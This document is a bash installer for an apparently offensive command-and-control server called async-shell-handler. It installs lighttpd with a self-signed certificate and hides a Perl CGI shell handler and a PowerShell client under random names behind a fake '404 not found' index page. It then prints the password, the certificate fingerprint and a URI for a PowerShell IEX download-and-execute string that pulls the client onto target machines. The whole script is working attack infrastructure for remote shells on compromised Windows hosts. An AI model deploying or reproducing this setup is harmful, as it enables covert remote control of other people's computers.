#!/bin/bash
#
# setup command and control server (C&C/C2/etc..)
# via the async-shell-handler cgi app
#
# xor-function

title() {

        echo "[*]===============================================================[*]"
        echo "[*] async-shell-handler                             ver .01 GPLv3 [*]"
        echo "[*]                                                               [*]"
        echo "[*] Installing...                                   xor-function  [*]"
        echo "[*]===============================================================[*]"

}

# func requires args: username
chk_usr() {
        if [ "$(whoami)" != "$1" ]; then
                echo "[!] you need to be root, exiting..."
                exit
        fi
}

chk_tubes() {
        echo "[*] Checking your tubes..."
        if ! ping -c 1 google.com > /dev/null 2>&1  ; then
                if ! ping -c 1 yahoo.com > /dev/null 2>&1  ; then
                        if ! ping -c 1 bing.com > /dev/null 2>&1 ; then
                                echo "[!] Do you have an internet connection?, exiting..."
                                exit 1
                        fi
                fi
        fi
        echo "[+] tubes working..."
}

# func requires argument
get_aptpkg() {

        tpkg=$(dpkg -s $1 | grep "install ok install")
        if [ -z "$tpkg" ]; then

                if [ -z $aptup ]; then
                        # rm -rf /var/lib/apt/lists/*
                        apt-get update
                        aptup=1
                fi

                echo "[*] installing $1"
                if ! apt-get -y install $1; then
                echo "[!] APT failed to install "$1", are your repos working? Exiting..."
                exit 1
                fi

        else

                echo "[+] $1 is already installed"
        fi
}

get_permission() {
while true; do
       printf "\n"
       read ansr
       case $ansr in
              [Yy] ) break;;
              [Nn] ) echo "[!] exiting..."; exit;;
                 * ) echo "[!] Not a valid entry, please answer y or n";;
       esac
done
echo "Continuing..."

}

# Uses a foldername, directory as a parameter
folder_perm() {
	chown www-data:www-data $1
	chmod 755 $1
}


# uses a filename as a parameter
file_perm() {
	chown www-data:www-data $1
	chmod 644 $1
}

rstr_short() {
	echo $(cat /dev/urandom | tr -dc '[:alnum:]' | head -c 8 )
}

rstr_long() {
	echo $(cat /dev/urandom | tr -dc _A-Z-a-z-0-9 | head -c 30 | base64)
}

clear
title
chk_usr root
chk_tubes

if [ ! -e ./lighttpd.conf ]; then
	echo "[!] could not find the lighttpd.conf file, cannot continue..."
	echo "[ ] exiting..."
	exit 1
elif [ ! -e ./cgi-shell-handler.pl ];then
        echo "[!] could not find the cgi-shell-handler.pl file, cannot continue..."
        echo "[ ] exiting..."
        exit 1
elif [ ! -e ./async-client.ps1 ]; then
        echo "[!] could not find the client file, cannot continue..."
        echo "[ ] exiting..."
        exit 1
fi

if [ -e /etc/lighttpd/lighttpd.conf ]; then
	echo "[!] lighttpd has been detected on your system"
	echo "[ ] the configuration files and ssl folder for lighttpd will be overwritten."
	echo "[ ] for the shell-handler. If you do NOT wish to continue take a look at the SSL"
	echo "[ ] setting in the included lighttpd.conf for the ssl settings."
	echo "[ ] continue? (y/n)"
	get_permission
	if [ -d /etc/lighttpd/ssl ]; then
		rm -rf /etc/lighttpd/ssl
	fi
fi

if [ -d /var/systems ]; then
	echo "[!] systems folder detected, folder contains info about systems runing the client"
	echo "[ ] by proceeding this folder will be deleted"
	echo "[ ] continue? (y/n)"
	get_permission
	rm -r /var/systems
fi

get_aptpkg lighttpd
get_aptpkg openssl
get_aptpkg perl
get_aptpkg libcgi-application-perl

## [ WEB SERVER ] #########

cat ./lighttpd.conf > /etc/lighttpd/lighttpd.conf
mkdir /etc/lighttpd/ssl
folder_perm /etc/lighttpd/ssl
openssl req -new -x509 -keyout /etc/lighttpd/ssl/server.pem -out /etc/lighttpd/ssl/server.pem -days 365 -nodes
keyprint=$(openssl x509 -in /etc/lighttpd/ssl/server.pem -fingerprint -noout | cut -d'=' -f2 | tr -d : )


## [ MOVING FILES ] #######

# cleaning up default files generated upon installation
rm -rf /var/www/*

echo "[*] Placing shell handler in web root folder with randomized name [ /var/www ]"
rname=$(rstr_short)
cp cgi-shell-handler.pl /var/www/$rname.pl

echo "[*] Placing client in web root folder with randomized name [ /var/www ]"
rclient=$(rstr_short)
cp async-client.ps1 /var/www/$rclient
cat > /var/www/index.html <<EOF
404 not found...
EOF

echo "[*] Setting web root folder permissions..."
file_perm /var/www/index.html
file_perm /var/www/$rname.pl
file_perm /var/www/$rclient

echo "[*] Generating random password for shell-handler."
mkdir /var/systems
pass=$(rstr_long)
echo $pass > /var/systems/init-pass
folder_perm /var/systems

service lighttpd restart

echo "[]=========================================================================[]"
echo "[] IMPORTANT---IMPORTANT---IMPORTANT---IMPORTANT---IMPORTANT---IMPORTANT"
echo "[]"
echo "[] The name of your shell-handler has been randomized."
echo "[] The name of the async client has been randomized."
echo "[]"
echo "[] Paste this in the async-client.ps1 script renamed as /var/www/$rclient"
echo "[] as { uri } variable"
echo "[]"
echo "[] \$uri = https://your-ip-or-domain/$rname.pl "
echo "[]"
echo "[] Client password needed to be granted access to connect to shell-handler"
echo "[] pass : [ $pass ]"
echo "[]"
echo "[] Paste this in the async-client.ps1 script renamed as /var/www/$rclient"
echo "[] as { key } variable"
echo "[]"
echo "[] \$key = $pass "
echo "[]"
echo "[] The following is the Thumb/finger print of your self-signed certificate"
echo "[] paste in the { certfingerprint } variable "
echo "[]"
echo "[] \$certfingerprint = $keyprint "
echo "[]"
echo "[] The name of the async client has been randomized so use this name for "
echo "[] your IEX download String."
echo "[]"
echo "[] URI: [ https://your-ip-or-domain/$rclient ] "
echo "[]"
echo "[] 		                                          rock n roll...."
echo "[]==========================================================================[]"

exit 0
